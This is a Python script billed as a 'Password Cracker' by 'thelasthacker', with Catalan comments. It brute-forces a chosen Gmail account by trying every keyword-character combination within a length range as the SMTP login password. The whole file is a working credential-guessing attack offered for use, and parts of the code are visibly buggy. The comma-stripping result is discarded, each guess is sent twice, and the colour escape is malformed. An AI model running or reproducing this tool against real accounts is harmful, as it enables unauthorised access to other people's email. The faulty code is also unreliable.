import argparse
from itertools import product
import requests
import smtplib

class Colors:
   OK = '\033[92m'
   FAIL = '\033[91m'
   BOLD = '\033[1m'
   ENDC = '\0m'
   UNDERLINE = '\033[4m'

print(Colors.BOLD + "               __________                               ")
print("               \______   \_____   __ __                 ")
print("                |     ___/\__  \ |  |  \                ")
print("                |    |     / __ \|  |  /                ")
print("                |____|    (____  /____/                 ")
print("                               \/                   .___")
print("___________    ______ ________  _  _____________  __| _/")
print("\____ \__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ | ")
print("|  |_> > __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ | ")
print("|   __(____  /____  >____  >  \/\_/ \____/|__|  \____ | ")
print("|__|       \/     \/     \/    __                    \/ ")
print("     ________________    ____ |  | __ ___________       ")
print("   _/ ___\_  __ \__  \ _/ ___\|  |/ // __ \_  __ \      ")
print("   \  \___|  | \// __ \\  \___|    <\  ___/|  | \/      ")
print("    \___  >__|  (____  /\___  >__|_ \\___  >__|         ")
print("        \/           \/     \/     \/    \/             " + Colors.ENDC)
print("                       V1.0                  By thelasthacker  \n")
   
smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
smtp_server.ehlo()
smtp_server.starttls()

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Especifica l'objectiu")
    parser.add_argument("-m", "--min", dest="min", help="Especifica el nombre minim de caracters en les variacions")
    parser.add_argument("-M", "--max", dest="max", help="Especifica el nombre maxim de caracters en les variacions")
    parser.add_argument("-k", "--kwords", dest="keywords", help="Introdueix les paraules clau")

    return parser.parse_args()

arguments = get_arguments()
target = arguments.target
KEYWORDS = arguments.keywords
min = int(arguments.min)
max = int(arguments.max)

#Funció per iniciar sessió amb una determinada contrasenya i usuari
def login(usuari,passw):
    try:
        smtp_server.login(usuari,passw)
        return True
    except smtplib.SMTPAuthenticationError:
        return False
       
#Convertint el string de paraules clau a una llista per a després poder permutarla
#we convert the keyword string to a list for, then, permute it
def treure_comes(KEYWORDS):
    KEYWORDS = list(KEYWORDS)
    for k in KEYWORDS:
        if k == ',':
            KEYWORDS.remove(',')
    
    KEYWORDS = ''.join(KEYWORDS)
    return KEYWORDS
   
#Ara fem les variacions sense repetició amb el min i el max de longitud del array
#Now, code the variations without repetition
def variacio(KEYWORDS,min,max):
    for i in range(min,max + 1):
        for chars in product(KEYWORDS,repeat=i):
            vars = ''.join(chars)
            if login(target,vars) == True:
                print("[" + Colors.OK + vars + "]" + " " + "Contrasenya trobada")
                break
            elif login(target,vars) == False:
                print("[" + Colors.FAIL + vars + "]" + " " + "Contrasenya fallida")

treure_comes(KEYWORDS)
variacio(KEYWORDS,min,max)
